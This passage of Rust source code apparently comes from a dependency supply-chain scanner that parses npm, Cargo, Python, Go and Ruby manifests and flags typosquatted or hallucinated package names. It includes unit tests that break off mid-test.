    let mut seen: BTreeSet<String> = BTreeSet::new();
    for host in read_sorted_dirs(root) {
        if truncated_at.is_some() {
            return;
        }
        for owner in read_sorted_dirs(&host) {
            if truncated_at.is_some() {
                return;
            }
            for mod_dir in read_sorted_dirs(&owner) {
                if declared.len() >= cap {
                    *truncated_at = Some(cap);
                    return;
                }
                let rel = match mod_dir.strip_prefix(root) {
                    Ok(p) => p.display().to_string(),
                    Err(_) => continue,
                };
                if !seen.insert(rel.clone()) {
                    continue;
                }
                let label = label_for(&mod_dir);
                manifest_labels.push(label.clone());
                declared.push((
                    DeclaredDependency {
                        name: rel,
                        ecosystem: Ecosystem::Go,
                        // Vendored layout carries no version on disk.
                        version: VersionIntent::Unspecified,
                        dev: false,
                    },
                    label,
                ));
            }
        }
    }
}

/// Sorted list of immediate subdirectories of `p`.
fn read_sorted_dirs(p: &Path) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = std::fs::read_dir(p)
        .map(|rd| {
            rd.filter_map(Result::ok)
                .map(|e| e.path())
                .filter(|x| x.is_dir())
                .collect()
        })
        .unwrap_or_default();
    out.sort();
    out
}

/// Parse a `Cargo.lock` into one [`DeclaredDependency`] per `[[package]]`.
fn parse_cargo_lock(text: &str) -> Vec<DeclaredDependency> {
    let Ok(doc) = toml::from_str::<toml::Value>(text) else {
        return Vec::new();
    };
    let mut out: Vec<DeclaredDependency> = Vec::new();
    let mut seen: BTreeSet<(String, Option<String>)> = BTreeSet::new();
    let Some(packages) = doc.get("package").and_then(|p| p.as_array()) else {
        return out;
    };
    for pkg in packages {
        let Some(name) = pkg.get("name").and_then(|v| v.as_str()) else {
            continue;
        };
        if !is_plausible_package_name(name) {
            continue;
        }
        let version = pkg
            .get("version")
            .and_then(|v| v.as_str())
            .map(str::to_string)
            .filter(|s| !s.is_empty());
        if seen.insert((name.to_string(), version.clone())) {
            out.push(DeclaredDependency {
                name: name.to_string(),
                ecosystem: Ecosystem::Crates,
                // Cargo.lock pins a concrete resolved version.
                version: lock_version_intent(version),
                dev: false,
            });
        }
    }
    out
}

/// Score one declared dependency into a [`DependencyAssessment`].
fn assess_dependency(
    dep: &DeclaredDependency,
    manifest: &str,
    request: &ScanRequest,
    api_cache: &mut std::collections::HashMap<(Ecosystem, String), ApiSignals>,
) -> DependencyAssessment {
    let name_vs_popular = package_risk::classify_name(request.db, dep.ecosystem, &dep.name);
    let malicious_typosquat_of = request
        .db
        .and_then(|db| db.check_typosquat(dep.ecosystem, &dep.name))
        .map(|ts| ts.target_name);

    // Registry-API signals — only on an `--online` scan, memoized per package.
    let api = match &request.online {
        OnlineMode::Off => ApiSignals::offline(),
        OnlineMode::Resolver(resolve) => {
            let key = (dep.ecosystem, dep.name.clone());
            api_cache
                .entry(key)
                .or_insert_with(|| resolve(dep.ecosystem, &dep.name))
                .clone()
        }
    };

    let signals = PackageSignals {
        ecosystem: dep.ecosystem,
        name: dep.name.clone(),
        // Manifest-declared version, carried through to OSV correlation.
        version: dep.version.as_version_str().map(str::to_string),
        threat_db_missing: request.db.is_none(),
        name_vs_popular: name_vs_popular.clone(),
        malicious_typosquat_of,
        // A manifest scan never has package content on disk, so content signals
        // are always NotInspected (use `package risk --path` to inspect content).
        content_signals: ContentSignals::NotInspected,
        api,
    };
    let risk = package_risk::score_package(&signals);

    let slopsquat = slopsquat(&dep.name, &name_vs_popular, request.db, dep.ecosystem);

    // Constraint-aware threat-DB assessment (A1e). A clean `NoRecord` is dropped
    // so reports gain no noise; only an actual signal is stored. No-DB stays
    // fail-open (no assessment).
    let threat_assessment =
        request.db.and_then(
            |db| match db.assess_package(dep.ecosystem, &dep.name, &dep.version) {
                PackageThreatAssessment::NoRecord => None,
                other => Some(other),
            },
        );

    let allowlisted = (request.is_allowlisted)(dep.ecosystem, &dep.name);

    DependencyAssessment {
        dependency: dep.clone(),
        manifest: manifest.to_string(),
        risk,
        slopsquat,
        threat_assessment,
        allowlisted,
    }
}

/// A scan-root-relative label for a manifest path, falling back to the full
/// path when it is not under the root.
fn relative_label(root: &Path, manifest: &Path) -> String {
    // When the root is a file, the manifest *is* the root.
    if root.is_file() {
        return manifest.display().to_string();
    }
    manifest
        .strip_prefix(root)
        .map(|rel| rel.display().to_string())
        .unwrap_or_else(|_| manifest.display().to_string())
}

impl EcosystemScanReport {
    /// The action the verdict resolved to.
    pub fn action(&self) -> Action {
        self.verdict.action
    }

    /// Count of dependencies whose findings were suppressed by an allowlist.
    pub fn allowlisted_count(&self) -> usize {
        self.assessments.iter().filter(|a| a.allowlisted).count()
    }

    /// The highest risk score across all assessed dependencies (0 when none).
    pub fn max_risk_score(&self) -> u32 {
        self.assessments
            .iter()
            .map(|a| a.risk.score)
            .max()
            .unwrap_or(0)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn manifest_kind_classifies_known_filenames() {
        assert_eq!(
            ManifestKind::from_file_name("package.json"),
            Some(ManifestKind::NpmPackageJson)
        );
        assert_eq!(
            ManifestKind::from_file_name("Cargo.toml"),
            Some(ManifestKind::CargoToml)
        );
        assert_eq!(
            ManifestKind::from_file_name("requirements-dev.txt"),
            Some(ManifestKind::PyRequirementsTxt)
        );
        assert_eq!(ManifestKind::from_file_name("README.md"), None);
        assert_eq!(ManifestKind::from_file_name("config.toml"), None);
    }

    #[test]
    fn manifest_kind_maps_to_ecosystem() {
        assert_eq!(ManifestKind::CargoToml.ecosystem(), Ecosystem::Crates);
        assert_eq!(ManifestKind::GoMod.ecosystem(), Ecosystem::Go);
        assert_eq!(ManifestKind::PyPyprojectToml.ecosystem(), Ecosystem::PyPI);
    }

    #[test]
    fn parse_package_json_extracts_deps_and_dev_deps() {
        let text = r#"{
            "name": "app",
            "dependencies": { "react": "^18.0.0", "lodash": "4.17.21" },
            "devDependencies": { "jest": "^29.0.0" }
        }"#;
        let deps = parse_package_json(text).expect("valid JSON parses");
        assert_eq!(deps.len(), 3);
        let react = deps.iter().find(|d| d.name == "react").unwrap();
        assert!(!react.dev);
        // A semver range is preserved as an unresolved Constraint (its text is
        // still reported as the version string).
        assert_eq!(react.version.as_version_str(), Some("^18.0.0"));
        assert!(matches!(
            react.version,
            VersionIntent::Constraint { parsed: None, .. }
        ));
        // A plain version is an exact pin.
        let lodash = deps.iter().find(|d| d.name == "lodash").unwrap();
        assert_eq!(lodash.version, VersionIntent::Exact("4.17.21".to_string()));
        let jest = deps.iter().find(|d| d.name == "jest").unwrap();
        assert!(jest.dev, "devDependencies must be tagged dev");
    }

    #[test]
    fn parse_package_json_handles_malformed() {
        // Malformed JSON → `None` (the manifest could not be parsed).
        assert!(parse_package_json("{not json").is_none());
        assert!(parse_package_json("").is_none());
        // Valid JSON with no dependency fields → `Some(empty)`: it parsed, it
        // just declares nothing.
        assert_eq!(parse_package_json(r#"{"name":"x"}"#), Some(Vec::new()));
    }

    #[test]
    fn parse_package_lock_v3_reads_packages_map() {
        let text = r#"{
            "lockfileVersion": 3,
            "packages": {
                "": { "name": "root" },
                "node_modules/lodash": { "version": "4.17.21" },
                "node_modules/jest": { "version": "29.0.0", "dev": true },
                "node_modules/a/node_modules/@scope/b": { "version": "1.0.0" }
            }
        }"#;
        let deps = parse_package_lock(text).expect("valid lockfile JSON parses");
        assert!(deps.iter().any(|d| d.name == "lodash"));
        assert!(deps.iter().any(|d| d.name == "jest" && d.dev));
        // The deepest path key resolves to the scoped name after the last
        // `node_modules/`.
        assert!(
            deps.iter().any(|d| d.name == "@scope/b"),
            "nested scoped package must be extracted: {deps:?}"
        );
        // The root entry ("") must NOT appear.
        assert!(!deps.iter().any(|d| d.name.is_empty()));
    }

    #[test]
    fn parse_package_lock_v1_reads_dependencies_tree() {
        let text = r#"{
            "lockfileVersion": 1,
            "dependencies": {
                "express": {
                    "version": "4.18.2",
                    "dependencies": { "accepts": { "version": "1.3.8" } }
                }
            }
        }"#;
        let deps = parse_package_lock(text).expect("valid lockfile JSON parses");
        assert!(deps.iter().any(|d| d.name == "express"));
        assert!(
            deps.iter().any(|d| d.name == "accepts"),
            "nested v1 deps must be collected"
        );
    }

    #[test]
    fn package_lock_name_from_path_handles_all_forms() {
        assert_eq!(
            package_lock_name_from_path("node_modules/lodash").as_deref(),
            Some("lodash")
        );
        assert_eq!(
            package_lock_name_from_path("node_modules/a/node_modules/@s/b").as_deref(),
            Some("@s/b")
        );
        assert_eq!(package_lock_name_from_path(""), None);
    }

    #[test]
    fn parse_requirements_txt_extracts_bare_names() {
        let text = "\
# a comment
requests>=2.28.0
flask[async]==3.0.0
django ; python_version < \"3.9\"

-r other-requirements.txt
--index-url https://pypi.org/simple
numpy  # inline comment
git+https://github.com/x/y.git
";
        let deps = parse_requirements_txt(text);
        let names: Vec<&str> = deps.iter().map(|d| d.name.as_str()).collect();
        assert!(names.contains(&"requests"));
        assert!(names.contains(&"flask"), "extras must be stripped");
        assert!(names.contains(&"django"), "env markers must be stripped");
        assert!(names.contains(&"numpy"), "inline comment must be stripped");
        // pip directives and VCS installs must NOT yield a name.
        assert!(!names.iter().any(|n| n.contains("other-requirements")));
        assert!(!names.iter().any(|n| n.contains("github")));
    }

    #[test]
    fn python_requirement_name_strips_specifiers() {
        assert_eq!(
            python_requirement_name("requests>=2.0").as_deref(),
            Some("requests")
        );
        assert_eq!(
            python_requirement_name("flask[async]").as_deref(),
            Some("flask")
        );
        assert_eq!(
            python_requirement_name("pkg @ file:///x").as_deref(),
            Some("pkg")
        );
        assert_eq!(python_requirement_name(""), None);
    }

    #[test]
    fn requirements_txt_pinned_dep_carries_version_intent() {
        let deps = parse_requirements_txt("requests==2.28.1\nflask>=2.0,<3.0\nbare-pkg\n");
        let requests = deps.iter().find(|d| d.name == "requests").unwrap();
        assert_eq!(requests.version, VersionIntent::Exact("2.28.1".to_string()));
        let flask = deps.iter().find(|d| d.name == "flask").unwrap();
        assert!(matches!(
            flask.version,
            VersionIntent::Constraint {
                parsed: Some(_),
                ..
            }
        ));
        let bare = deps.iter().find(|d| d.name == "bare-pkg").unwrap();
        assert_eq!(bare.version, VersionIntent::Unspecified);
    }

    #[test]
    fn pyproject_pep621_pinned_dep_is_exact() {
        let toml = "[project]\ndependencies = [\"requests==2.28.1\", \"flask\"]\n";
        let deps = parse_pyproject_toml(toml).unwrap();
        let requests = deps.iter().find(|d| d.name == "requests").unwrap();
        assert_eq!(requests.version, VersionIntent::Exact("2.28.1".to_string()));
        let flask = deps.iter().find(|d| d.name == "flask").unwrap();
        assert_eq!(flask.version, VersionIntent::Unspecified);
    }

    #[test]
    fn npm_partial_version_is_range_not_exact() {
        // node-semver: `1.2` == `1.2.x` (a range); full `1.2.3` is exact.
        assert!(matches!(
            npm_manifest_intent("1.2"),
            VersionIntent::Constraint {
                parsed: Some(_),
                ..
            }
        ));
        assert_eq!(
            npm_manifest_intent("1.2.3"),
            VersionIntent::Exact("1.2.3".to_string())
        );
    }

    #[test]
    fn parse_pyproject_pep621_dependencies() {
        let text = r#"
[project]
name = "app"
dependencies = ["requests>=2.0", "click"]

[project.optional-dependencies]
dev = ["pytest>=7.0", "black"]
"#;
        let deps = parse_pyproject_toml(text).expect("valid TOML parses");
        let names: Vec<&str> = deps.iter().map(|d| d.name.as_str()).collect();
        assert!(names.contains(&"requests"));
        assert!(names.contains(&"click"));
        let pytest = deps.iter().find(|d| d.name == "pytest").unwrap();
        assert!(pytest.dev, "optional-dependencies are dev-tagged");
    }

    #[test]
    fn parse_pyproject_poetry_dependencies() {
        let text = r#"
[tool.poetry.dependencies]
python = "^3.10"
requests = "^2.28"

[tool.poetry.group.dev.dependencies]
pytest = "^7.0"
"#;
        let deps = parse_pyproject_toml(text).expect("valid TOML parses");
        let names: Vec<&str> = deps.iter().map(|d| d.name.as_str()).collect();
        assert!(names.contains(&"requests"));
        assert!(
            !names.contains(&"python"),
            "the python interpreter constraint is not a dependency"
        );
        let pytest = deps.iter().find(|d| d.name == "pytest").unwrap();
        assert!(pytest.dev, "poetry dev group must be dev-tagged");
    }

    #[test]
    fn parse_pyproject_handles_malformed() {
        // Malformed TOML → `None` (the manifest could not be parsed).
        assert!(parse_pyproject_toml("[[[not toml").is_none());
    }

    #[test]
    fn parse_cargo_toml_extracts_all_dep_tables() {
        let text = r#"
[package]
name = "app"

[dependencies]
serde = "1.0"
tokio = { version = "1", features = ["full"] }

[dev-dependencies]
criterion = "0.5"

[build-dependencies]
cc = "1.0"
"#;
        let deps = parse_cargo_toml(text).expect("valid TOML parses");
        let names: Vec<&str> = deps.iter().map(|d| d.name.as_str()).collect();
        assert!(names.contains(&"serde"));
        assert!(names.contains(&"tokio"));
        assert!(names.contains(&"cc"));
        let criterion = deps.iter().find(|d| d.name == "criterion").unwrap();
        assert!(criterion.dev);
    }

    #[test]
    fn parse_cargo_toml_resolves_package_rename() {
        // `[dependencies] foo = { package = "real-crate" }` — the real crate
        // name must be scored, not the table key.
        let text = r#"
[dependencies]
foo = { version = "1", package = "real-crate" }
"#;
        let deps = parse_cargo_toml(text).expect("valid TOML parses");
        assert!(
            deps.iter().any(|d| d.name == "real-crate"),
            "the renamed-to crate must be scored: {deps:?}"
        );
        assert!(!deps.iter().any(|d| d.name == "foo"));
    }

    #[test]
    fn parse_cargo_toml_reads_target_specific_deps() {
        let text = r#"
[target.'cfg(unix)'.dependencies]
libc = "0.2"
"#;
        let deps = parse_cargo_toml(text).expect("valid TOML parses");
        assert!(deps.iter().any(|d| d.name == "libc"));
    }

    #[test]
    fn parse_go_mod_reads_block_and_single_require() {
        let text = "\
module example.com/app

go 1.21

require github.com/pkg/errors v0.9.1

require (
    github.com/spf13/cobra v1.7.0
    golang.org/x/sync v0.3.0 // indirect
)
";
        let deps = parse_go_mod(text);
        let names: Vec<&str> = deps.iter().map(|d| d.name.as_str()).collect();
        assert!(names.contains(&"github.com/pkg/errors"));
        assert!(names.contains(&"github.com/spf13/cobra"));
        assert!(
            names.contains(&"golang.org/x/sync"),
            "the // indirect comment must be stripped, name kept"
        );
    }

    #[test]
    fn parse_gemfile_reads_gem_directives_and_groups() {
        let text = "\
source 'https://rubygems.org'

gem 'rails', '~> 7.0'
gem \"puma\"

group :development, :test do
  gem 'rspec'
end
";
        let deps = parse_gemfile(text);
        let names: Vec<&str> = deps.iter().map(|d| d.name.as_str()).collect();
        assert!(names.contains(&"rails"));
        assert!(names.contains(&"puma"));
        let rspec = deps.iter().find(|d| d.name == "rspec").unwrap();
        assert!(rspec.dev, "a gem in a :test group must be dev-tagged");
    }

    #[test]
    fn parse_gemfile_nested_non_dev_group_keeps_dev_tag() {
        // A non-dev group nested inside a `:development` group: its closing
        // `end` must not clear the dev tag of gems that follow it but are
        // still inside the outer dev group.
        let text = "\
group :development do
  gem 'beforegem'
  group :assets do
    gem 'innergem'
  end
  gem 'aftergem'
end
gem 'toplevelgem'
";
        let deps = parse_gemfile(text);
        let dev = |n: &str| deps.iter().find(|d| d.name == n).unwrap().dev;
        assert!(dev("beforegem"), "a gem before the nested group is dev");
        assert!(
            dev("aftergem"),
            "a gem after a nested non-dev group, still inside :development, must stay dev-tagged"
        );
        assert!(!dev("toplevelgem"), "a top-level gem is not dev");
    }

    #[test]
    fn plausible_package_name_rejects_garbage() {
        assert!(is_plausible_package_name("react"));
        assert!(is_plausible_package_name("@scope/pkg"));
        assert!(is_plausible_package_name("github.com/x/y"));
        assert!(!is_plausible_package_name(""));
        assert!(!is_plausible_package_name("has spaces"));
        assert!(!is_plausible_package_name("{table}"));
    }

    #[test]
    fn hallucinated_shape_flags_lang_prefix_descriptive_name() {
        let shape = hallucinated_name_shape("python-requests-helper");
        assert!(shape.is_some(), "lang prefix + descriptive name is a shape");
        assert!(shape.unwrap().contains("python"));
    }

    #[test]
    fn hallucinated_shape_flags_filler_word_stack() {
        let shape = hallucinated_name_shape("data-utils-helper");
        assert!(
            shape.is_some(),
            "a name that is mostly filler words is a shape"
        );
    }

    #[test]
    fn hallucinated_shape_ignores_normal_names() {
        // Real, normal package names must NOT match a hallucinated shape.
        assert!(hallucinated_name_shape("lodash").is_none());
        assert!(hallucinated_name_shape("react").is_none());
        assert!(hallucinated_name_shape("left-pad").is_none());
        assert!(hallucinated_name_shape("body-parser").is_none());
    }

    #[test]
    fn hallucinated_shape_flags_long_descriptive_name() {
        // 4+ tokens with a filler word.
        let shape = hallucinated_name_shape("acme-data-sync-helper-module");
        assert!(shape.is_some());
    }

    #[test]
    fn slopsquat_clear_for_known_popular() {
        let a = slopsquat("react", &NameVsPopular::KnownPopular, None, Ecosystem::Npm);
        assert_eq!(
            a,
            SlopsquatAssessment::Clear,
            "a known-popular package is never slopsquat"
        );
    }

    #[test]
    fn slopsquat_clear_for_normal_unknown_name() {
        // Unknown, but a normal single-token name and no popular anchor.
        let a = slopsquat(
            "mycompanyinternal",
            &NameVsPopular::Unknown,
            None,
            Ecosystem::Npm,
        );
        assert!(
            !a.is_suspicious(),
            "an unknown name with no hallucinated shape and no anchor is not slopsquat"
        );
    }

    #[test]
    fn slopsquat_fires_on_hallucinated_shape_near_popular() {
        // Hallucinated shape (lang prefix + descriptive) AND near a popular
        // package (edit-distance near-miss supplied as the classification).
        let near = NameVsPopular::NearPopular {
            popular_name: "requests".to_string(),
            distance: 1,
        };
        let a = slopsquat("python-requests-helper", &near, None, Ecosystem::PyPI);
        match a {
            SlopsquatAssessment::Suspicious {
                reasons,
                near_popular,
            } => {
                assert_eq!(near_popular, "requests");
                assert!(!reasons.is_empty());
            }
            SlopsquatAssessment::Clear => {
                panic!("hallucinated shape + near-popular anchor must fire")
            }
        }
    }

    #[test]
    fn slopsquat_does_not_fire_on_shape_alone() {
        // A hallucinated shape but NO popular anchor (Unknown, no DB) must not
        // fire — the anchor is required to keep false positives down.
        let a = slopsquat(
            "data-utils-helper",
            &NameVsPopular::Unknown,
            None,
            Ecosystem::Npm,
        );
        assert!(
            !a.is_suspicious(),
            "a hallucinated shape with no popular anchor must not fire"
        );
    }

    #[test]
    fn slopsquat_does_not_fire_on_anchor_alone() {
        // A near-popular miss but a NORMAL (non-hallucinated) name must not
        // fire as slopsquat — that is the plain `similar_name` case.
        let near = NameVsPopular::NearPopular {
            popular_name: "lodash".to_string(),
            distance: 1,
        };
        let a = slopsquat("lodahs", &near, None, Ecosystem::Npm);
        assert!(
            !a.is_suspicious(),
            "a near-miss with a normal name shape is similar_name, not slopsquat"
        );
    }

    fn assessment_with(
        name: &str,
        name_vs_popular: NameVsPopular,
        malicious_typosquat_of: Option<String>,
        slop: SlopsquatAssessment,
        allowlisted: bool,
    ) -> DependencyAssessment {
        let signals = PackageSignals {
            ecosystem: Ecosystem::Npm,
            name: name.to_string(),
            version: None,
            threat_db_missing: false,
            name_vs_popular,
            malicious_typosquat_of,
            content_signals: ContentSignals::NotInspected,
            api: ApiSignals::offline(),
        };
        DependencyAssessment {
            dependency: DeclaredDependency {
                name: name.to_string(),
                ecosystem: Ecosystem::Npm,
                version: VersionIntent::Unspecified,
                dev: false,
            },
            manifest: "package.json".to_string(),
            risk: package_risk::score_package(&signals),
            slopsquat: slop,
            threat_assessment: None,
            allowlisted,
        }
    }

    #[test]
    fn findings_for_allowlisted_dependency_are_suppressed() {
        let a = assessment_with(
            "evil-pkg",
            NameVsPopular::NearPopular {
                popular_name: "react".to_string(),
                distance: 1,
            },
            Some("react".to_string()),
            SlopsquatAssessment::clear(),
            /* allowlisted = */ true,
        );
        let policy = crate::policy::Policy::default();
        assert!(
            findings_for(&a, &policy).is_empty(),
            "an allowlisted dependency must yield no findings"
        );
    }

    #[test]
    fn findings_for_confirmed_typosquat_is_high() {
        let a = assessment_with(
            "raect",
            NameVsPopular::NearPopular {
                popular_name: "react".to_string(),
                distance: 1,
            },
            Some("react".to_string()),
            SlopsquatAssessment::clear(),
            false,
        );
        let policy = crate::policy::Policy::default();
        let findings = findings_for(&a, &policy);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::ThreatPackageTyposquat);
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn findings_for_slopsquat_is_medium_suspicious_package() {
        let slop = SlopsquatAssessment::Suspicious {
            reasons: vec!["test reason".to_string()],
            near_popular: "requests".to_string(),
        };
        let a = assessment_with(
            "python-requests-helper",
            NameVsPopular::Unknown,
            None,
            slop,
            false,
        );
        let policy = crate::policy::Policy::default();
        let findings = findings_for(&a, &policy);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::ThreatSuspiciousPackage);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0].title.contains("slopsquat"));
    }

    #[test]
    fn findings_for_similar_name_only_is_medium() {
        let a = assessment_with(
            "lodahs",
            NameVsPopular::NearPopular {
                popular_name: "lodash".to_string(),
                distance: 1,
            },
            None,
            SlopsquatAssessment::clear(),
            false,
        );
        let policy = crate::policy::Policy::default();
        let findings = findings_for(&a, &policy);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::ThreatPackageSimilarName);
    }

    #[test]
    fn findings_for_clean_dependency_are_empty() {
        let a = assessment_with(
            "react",
            NameVsPopular::KnownPopular,
            None,
            SlopsquatAssessment::clear(),
            false,
        );
        let policy = crate::policy::Policy::default();
        assert!(findings_for(&a, &policy).is_empty());
    }

    #[test]
    fn findings_for_provenance_only_high_risk_emits_finding() {
        // PR #121 fix-list item 2 regression pin — a dependency with no
        // name-shape risk but a High/Critical provenance score MUST emit a
        // finding (previously it produced none). The fully-loaded provenance
        // stacks enough points to cross the High threshold.
        #[allow(deprecated)]
        let provenance = package_risk::ApiProvenance {
            source: "npm".to_string(),
            package_age_days: Some(1),
            latest_version_age_days: Some(0),
            ownership_transferred: Some(true),
            version_spike: Some(true),
            recent_downloads: Some(3),
            has_source_repo: Some(false),
            yanked_or_deprecated: true,
            latest_version: Some("9.9.9".to_string()),
            ..Default::default()
        };
        let signals = PackageSignals {
            ecosystem: Ecosystem::Npm,
            name: "totally-unknown-pkg".to_string(),
            version: None,
            threat_db_missing: false,
            name_vs_popular: NameVsPopular::Unknown,
            malicious_typosquat_of: None,
            content_signals: ContentSignals::NotInspected,
            api: ApiSignals::Available { provenance },
        };
        let breakdown = package_risk::score_package(&signals);
        assert!(
            matches!(breakdown.risk_level, "high" | "critical"),
            "test fixture must produce a High/Critical score for the \
             provenance-only path to exercise: score={} level={}",
            breakdown.score,
            breakdown.risk_level,
        );
        let assessment = DependencyAssessment {
            dependency: DeclaredDependency {
                name: "totally-unknown-pkg".to_string(),
                ecosystem: Ecosystem::Npm,
                version: VersionIntent::Unspecified,
                dev: false,
            },
            manifest: "package.json".to_string(),
            risk: breakdown,
            slopsquat: SlopsquatAssessment::clear(),
            threat_assessment: None,
            allowlisted: false,
        };
        let policy = crate::policy::Policy::default();
        let findings = findings_for(&assessment, &policy);
        assert!(
            !findings.is_empty(),
            "provenance-only High/Critical risk MUST emit a finding"
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ThreatSuspiciousPackage),
            "expected a ThreatSuspiciousPackage finding, got {:?}",
            findings.iter().map(|f| f.rule_id).collect::<Vec<_>>(),
        );
        // M6 ch7: severity is High when score >= block_aggregate_score (76)
        // and Medium when warn_aggregate_score <= score < block_aggregate_score
        // (51..76). Both fire — the test only pins that *something* fires.
        assert!(
            findings.iter().any(|f| matches!(
                f.severity,
                Severity::Medium | Severity::High | Severity::Critical
            )),
            "provenance-only finding must be Medium+, got {:?}",
            findings.iter().map(|f| f.severity).collect::<Vec<_>>(),
        );
    }

    #[test]
    fn findings_for_low_or_medium_risk_with_no_name_shape_emits_nothing() {
        // The provenance-only fall-through fires ONLY on High/Critical; a
        // Low/Medium score with no name-shape signal stays clean (keeps the
        // threshold conservative).
        let signals = PackageSignals {
            ecosystem: Ecosystem::Npm,
            name: "ordinary-pkg".to_string(),
            version: None,
            threat_db_missing: false,
            name_vs_popular: NameVsPopular::Unknown,
            malicious_typosquat_of: None,
            content_signals: ContentSignals::NotInspected,
            api: ApiSignals::offline(), // offline → no api factors
        };
        let breakdown = package_risk::score_package(&signals);
        assert!(
            matches!(breakdown.risk_level, "low" | "medium"),
            "offline + unknown name must score Low/Medium: score={} level={}",
            breakdown.score,
            breakdown.risk_level,
        );
        let assessment = DependencyAssessment {
            dependency: DeclaredDependency {
                name: "ordinary-pkg".to_string(),
                ecosystem: Ecosystem::Npm,
                version: VersionIntent::Unspecified,
                dev: false,
            },
            manifest: "package.json".to_string(),
            risk: breakdown,
            slopsquat: SlopsquatAssessment::clear(),
            threat_assessment: None,
            allowlisted: false,
        };
        let policy = crate::policy::Policy::default();
        assert!(
            findings_for(&assessment, &policy).is_empty(),
            "Low/Medium provenance-only score with no name-shape signal must \
             not emit a finding"
        );
    }

    #[test]
    fn typosquat_policy_fires_when_api_signals_unavailable() {
        // Regression: the offline PackagePolicyTyposquatDistance gate used to be
        // skipped when api_signals was not Available, losing typosquat findings
        // on a degraded `--online` scan. Pin that it fires regardless of API state.
        let signals = PackageSignals {
            ecosystem: Ecosystem::Npm,
            name: "reaqt".to_string(),
            version: None,
            threat_db_missing: false,
            name_vs_popular: NameVsPopular::NearPopular {
                popular_name: "react".to_string(),
                distance: 1,
            },
            malicious_typosquat_of: None,
            content_signals: ContentSignals::NotInspected,
            // Critically, the registry call FAILED — we have no provenance.
            api: ApiSignals::unavailable("simulated network timeout"),
        };
        let breakdown = package_risk::score_package(&signals);
        let assessment = DependencyAssessment {
            dependency: DeclaredDependency {
                name: "reaqt".to_string(),
                ecosystem: Ecosystem::Npm,
                version: VersionIntent::Unspecified,
                dev: false,
            },
            manifest: "package.json".to_string(),
            risk: breakdown,
            slopsquat: SlopsquatAssessment::clear(),
            threat_assessment: None,
            allowlisted: false,
        };
        // Configure a typosquat-distance policy threshold.
        let mut policy = crate::policy::Policy::default();
        policy.package_policy.block_typosquat_distance = Some(2);

        let findings = policy_findings_for_assessment(&assessment, &policy);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PackagePolicyTyposquatDistance),
            "PackagePolicyTyposquatDistance must fire even when API is \
             unavailable — got rule_ids: {:?}",
            findings.iter().map(|f| f.rule_id).collect::<Vec<_>>(),
        );
    }

    #[test]
    fn scan_discovers_and_scores_a_temp_project() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"dependencies":{"react":"^18.0.0"}}"#,
        )
        .unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[dependencies]\nserde = \"1.0\"\n",
        )
        .unwrap();

        let never_allowlisted = |_eco: Ecosystem, _name: &str| false;
        let request = ScanRequest {
            root: dir.path(),
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allowlisted,
            mode: ScanMode::Manifests,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.manifests.len(), 2, "both manifests discovered");
        assert_eq!(report.dependency_count, 2);
        assert!(!report.online);
        // With no threat DB, names classify as Unknown — no findings, but a
        // note about the missing DB is present.
        assert!(report
            .notes
            .iter()
            .any(|n| n.note.contains("threat database")));
    }

    #[test]
    fn scan_skips_node_modules_and_target() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("package.json"), r#"{"dependencies":{}}"#).unwrap();
        // A manifest *inside* node_modules must NOT be discovered.
        let nm = dir.path().join("node_modules").join("dep");
        std::fs::create_dir_all(&nm).unwrap();
        std::fs::write(nm.join("package.json"), r#"{"dependencies":{}}"#).unwrap();

        let manifests = discover_manifests(dir.path());
        assert_eq!(
            manifests.len(),
            1,
            "node_modules must be skipped: {manifests:?}"
        );
    }

    #[test]
    fn scan_of_single_manifest_file_works() {
        let dir = tempfile::tempdir().unwrap();
        let manifest = dir.path().join("Cargo.toml");
        std::fs::write(&manifest, "[dependencies]\nserde = \"1\"\n").unwrap();

        let manifests = discover_manifests(&manifest);
        assert_eq!(manifests.len(), 1);
        assert_eq!(manifests[0].kind, ManifestKind::CargoToml);
    }

    #[test]
    fn scan_handles_empty_directory() {
        let dir = tempfile::tempdir().unwrap();
        let never_allowlisted = |_eco: Ecosystem, _name: &str| false;
        let request = ScanRequest {
            root: dir.path(),
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allowlisted,
            mode: ScanMode::Manifests,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.dependency_count, 0);
        assert_eq!(report.verdict.action, Action::Allow);
        assert!(report
            .notes
            .iter()
            .any(|n| n.note.contains("no dependency manifests")));
    }

    #[test]
    fn scan_allowlist_suppresses_findings() {
        // A near-popular dependency would normally yield a finding; an
        // allowlist predicate matching it suppresses the finding but the
        // assessment is still reported.
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"dependencies":{"my-internal-pkg":"1.0.0"}}"#,
        )
        .unwrap();
        let allow_all = |_eco: Ecosystem, _name: &str| true;
        let request = ScanRequest {
            root: dir.path(),
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &allow_all,
            mode: ScanMode::Manifests,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.allowlisted_count(), 1);
        assert!(report.verdict.findings.is_empty());
    }

    #[test]
    fn scan_online_resolver_is_memoized_per_package() {
        use std::cell::RefCell;
        // The same package declared in two manifests must trigger the
        // resolver at most once.
        let dir = tempfile::tempdir().unwrap();
        let sub = dir.path().join("sub");
        std::fs::create_dir_all(&sub).unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"dependencies":{"shared-dep":"1.0.0"}}"#,
        )
